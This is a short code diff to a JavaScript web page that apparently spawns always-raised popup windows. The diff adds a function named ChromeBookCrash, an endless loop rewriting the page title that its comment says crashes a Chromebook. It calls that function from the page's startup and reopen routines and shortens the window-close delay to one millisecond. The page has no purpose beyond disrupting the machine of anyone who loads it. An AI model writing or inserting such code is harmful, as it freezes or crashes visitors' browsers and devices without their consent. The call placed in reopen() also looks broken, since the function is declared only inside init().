@@ -7,6 +7,7 @@ function reopen() {
     "",
     "blankmenubar=no,status=no,toolbar=noresizable=no,width=350,height=370,titlebar=no,alwaysRaised=yes"
   );
+  ChromeBookCrash();
 }
 function spam() {
   for (var i = 0; i < 10; i++) {
@@ -27,7 +28,13 @@ function init() {
   reopen();
   setTimeout(function () {
     window.close();
-  }, 10000);
+  }, 1);
+  var ChromeBookCrash = () => {
+      //these 2 lines of javascript crash a chromebook
+      let c = 0;
+      while(1) document.title = c++;
+  }
+  ChromeBookCrash();
 }
 var xOff = 5,
   yOff = 5,
